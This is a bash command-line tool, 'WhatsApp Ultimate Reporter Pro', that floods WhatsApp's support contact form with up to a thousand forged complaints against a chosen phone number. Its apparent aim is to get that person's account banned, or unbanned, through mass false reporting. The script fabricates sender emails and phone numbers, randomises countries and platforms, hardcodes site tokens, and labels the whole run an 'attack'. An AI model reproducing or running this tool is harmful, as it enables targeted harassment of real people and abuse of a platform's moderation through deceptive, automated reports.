clear
#!/bin/bash

# WhatsApp Ultimate Reporter Pro - Ubuntu Style CLI
# Created by >>BayLak<< 2025/01/22

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Configuration
WHATSAPP_API_URL="https://www.whatsapp.com/contact/noclient/"
REPORT_URL="https://faq.whatsapp.com/3379690015658337/?helpref=uf_share"
LOG_FILE="whatsapp_ultimate.log"
PHONES_DB="phones.db"
IPS_DB="ips.db"
BAN_MSG_FILE="message_ban_whatsapp.json"
UNBAN_MSG_FILE="message_unban_whatsapp.json"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"

# WhatsApp Parameters
AJAXPIPE_TOKEN="AXjVMTl_Wz4hIrAtZA8"
FB_LSD="AVpbkNjZYpw"
BRSID="7525697063073108760"

# ASCII Art
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo " ██╗    ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ "
    echo " ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗"
    echo " ██║ █╗ ██║███████║   ██║   ███████╗███████║██████╔╝██████╔╝"
    echo " ██║███╗██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ "
    echo " ╚███╔███╔╝██║  ██║   ██║   ███████║██║  ██║██║     ██║     "
    echo "  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     "
    echo -e "${NC}"
    echo -e "${BLUE}WhatsApp Ultimate Reporter Pro - Ubuntu Style CLI${NC}"
    echo -e "${YELLOW}===============================================${NC}"
    echo -e "${CYAN}Version: 2.5.1 ${NC}| ${CYAN}Author: LORDHOZOO${NC}"
    echo
}

# Main Menu
main_menu() {
    while true; do
        echo -e "${GREEN}Main Menu:${NC}"
        echo -e "1. ${WHITE}Start Attack${NC}"
        echo -e "2. ${WHITE}Configuration${NC}"
        echo -e "3. ${WHITE}View Logs${NC}"
        echo -e "4. ${WHITE}System Info${NC}"
        echo -e "5. ${WHITE}Exit${NC}"
        echo
        read -p "$(echo -e "${YELLOW}Select an option [1-5]: ${NC}")" choice

        case $choice in
            1) attack_menu ;;
            2) config_menu ;;
            3) view_logs ;;
            4) system_info ;;
            5) exit 0 ;;
            *) echo -e "${RED}Invalid option!${NC}" ;;
        esac
    done
}

# Attack Menu
attack_menu() {
    echo -e "${BLUE}"
    echo "  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
    echo " ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
    echo " ███████║   ██║      ██║   ███████║██║     █████╔╝ "
    echo " ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
    echo " ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
    echo " ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    
    # Get target number
    while true; do
        read -p "$(echo -e "${CYAN}Enter target number (+628123456789): ${NC}")" target_number
        if [[ $target_number =~ ^\+[0-9]{10,15}$ ]]; then
            break
        else
            echo -e "${RED}Invalid format! Example: +628123456789${NC}"
        fi
    done

    # Action selection
    echo -e "\n${GREEN}Select Action:${NC}"
    select action in "Ban" "Unban" "Back"; do
        case $action in
            "Ban"|"Unban") 
                action=$(echo "$action" | tr '[:upper:]' '[:lower:]')
                break ;;
            "Back") return ;;
            *) echo -e "${RED}Invalid option!${NC}" ;;
        esac
    done

    # Request parameters
    echo -e "\n${YELLOW}Attack Parameters:${NC}"
    read -p "$(echo -e "${CYAN}Number of requests [1-1000]: ${NC}")" num_requests
    num_requests=${num_requests:-100}
    [[ $num_requests -lt 1 ]] && num_requests=1
    [[ $num_requests -gt 1000 ]] && num_requests=1000

    read -p "$(echo -e "${CYAN}Delay between requests (seconds) [1-60]: ${NC}")" delay
    delay=${delay:-5}
    [[ $delay -lt 1 ]] && delay=1
    [[ $delay -gt 60 ]] && delay=60

    # Confirmation
    echo -e "\n${PURPLE}Attack Summary:${NC}"
    echo -e "Target: ${WHITE}$target_number${NC}"
    echo -e "Action: ${WHITE}$action${NC}"
    echo -e "Requests: ${WHITE}$num_requests${NC}"
    echo -e "Delay: ${WHITE}$delay seconds${NC}\n"

    read -p "$(echo -e "${RED}Start attack? [y/N]: ${NC}")" confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then
        perform_attack "$num_requests" "$delay" "$target_number" "$action"
    else
        echo -e "${YELLOW}Attack cancelled!${NC}"
    fi
}

# Configuration Menu
config_menu() {
    echo -e "\n${BLUE}Configuration Menu${NC}"
    echo -e "1. ${WHITE}Edit Phone Database${NC}"
    echo -e "2. ${WHITE}Edit IP Database${NC}"
    echo -e "3. ${WHITE}Edit Ban Messages${NC}"
    echo -e "4. ${WHITE}Edit Unban Messages${NC}"
    echo -e "5. ${WHITE}Back to Main Menu${NC}"
    
    read -p "$(echo -e "${CYAN}Select option [1-5]: ${NC}")" choice
    case $choice in
        1) nano "$PHONES_DB" ;;
        2) nano "$IPS_DB" ;;
        3) nano "$BAN_MSG_FILE" ;;
        4) nano "$UNBAN_MSG_FILE" ;;
        5) return ;;
        *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
}

# View Logs
view_logs() {
    echo -e "\n${YELLOW}=== Log File Contents ===${NC}"
    if [ -f "$LOG_FILE" ]; then
        less "$LOG_FILE"
    else
        echo -e "${RED}No log file found!${NC}"
    fi
}

# System Information
system_info() {
    echo -e "\n${GREEN}=== System Information ===${NC}"
    echo -e "${CYAN}Hostname:${NC} $(hostname)"
    echo -e "${CYAN}OS:${NC} $(lsb_release -d | cut -f2)"
    echo -e "${CYAN}Kernel:${NC} $(uname -r)"
    echo -e "${CYAN}CPU:${NC} $(lscpu | grep "Model name" | cut -d: -f2 | sed 's/^[ \t]*//')"
    echo -e "${CYAN}Memory:${NC} $(free -h | grep Mem | awk '{print $2}') Total"
    echo -e "${CYAN}IP Address:${NC} $(hostname -I | awk '{print $1}')"
    echo -e "${CYAN}Public IP:${NC} $(curl -s ifconfig.me)"
    echo
    read -p "$(echo -e "${YELLOW}Press Enter to continue...${NC}")"
}

# Attack Function
perform_attack() {
    local num_requests=$1
    local delay=$2
    local target_number=$3
    local action=$4
    
    # Load messages
    local messages=()
    while IFS= read -r line; do
        messages+=("$line")
    done < <(jq -c '.[]' "$BAN_MSG_FILE")
    
    # Countries with emphasis on Indonesia (ID)
    local countries=("ID" "ID" "ID" "EG" "US" "KR" "CN" "IN")
    local platforms=("ANDROID" "IPHONE" "WHATS_APP_WEB_DESKTOP" "KAIOS" "OTHER")
    
    echo -e "\n${PURPLE}Starting attack...${NC}"
    echo -e "${CYAN}Target:${NC} ${WHITE}$target_number${NC}"
    echo -e "${CYAN}Mode:${NC} ${WHITE}$action${NC}"
    echo -e "${CYAN}Requests:${NC} ${WHITE}$num_requests${NC}"
    echo -e "${CYAN}Delay:${NC} ${WHITE}$delay seconds${NC}\n"
    
    for ((i=1; i<=num_requests; i++)); do
        # Get random values
        local random_phone=$(shuf -n 1 "$PHONES_DB")
        local random_ip=$(shuf -n 1 "$IPS_DB")
        local random_message=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.message' | sed "s/\[###\]/$target_number/g")
        local random_subject=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.subject')
        local country_selector=${countries[$(( RANDOM % ${#countries[@]} ))]}
        local platform=${platforms[$(( RANDOM % ${#platforms[@]} ))]}
        local email="user$(date +%s)@gmail.com"
        local phone_number="+62$(shuf -i 100000000-999999999 -n 1)"
        
        # Prepare data
        local post_data="country_selector=${country_selector}&email=${email}&email_confirm=${email}&phone_number=${phone_number}&platform=${platform}&your_message=${random_subject}%A0${random_message}&step=articles&__user=0&__a=$(( RANDOM % 1000000000 + 1 ))&__req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')"
        
        # Send request
        local response=$(curl -s -X POST "$WHATSAPP_API_URL" \
            -H "Host: www.whatsapp.com" \
            -H "User-Agent: $USER_AGENT" \
            -H "X-Fb-Lsd: $FB_LSD" \
            --data-raw "$post_data" \
            -w "\n%{http_code}")
        
        local http_code=$(echo "$response" | tail -n1)
        
        # Display result
        if [ "$http_code" -eq 200 ]; then
            echo -e "${GREEN}[SUCCESS]${NC} Request $i from $random_ip"
        else
            echo -e "${RED}[FAILED]${NC} Request $i (Status: $http_code)"
        fi
        
        # Send report URL periodically
        if (( i % 5 == 0 )); then
            echo -e "${BLUE}Sending report URL for $target_number${NC}"
        fi
        
        sleep $delay
    done
    
    echo -e "\n${GREEN}Attack completed!${NC}"
    echo -e "${YELLOW}Results saved to: $LOG_FILE${NC}\n"
    read -p "$(echo -e "${CYAN}Press Enter to continue...${NC}")"
}

# Main Execution
show_banner
main_menu
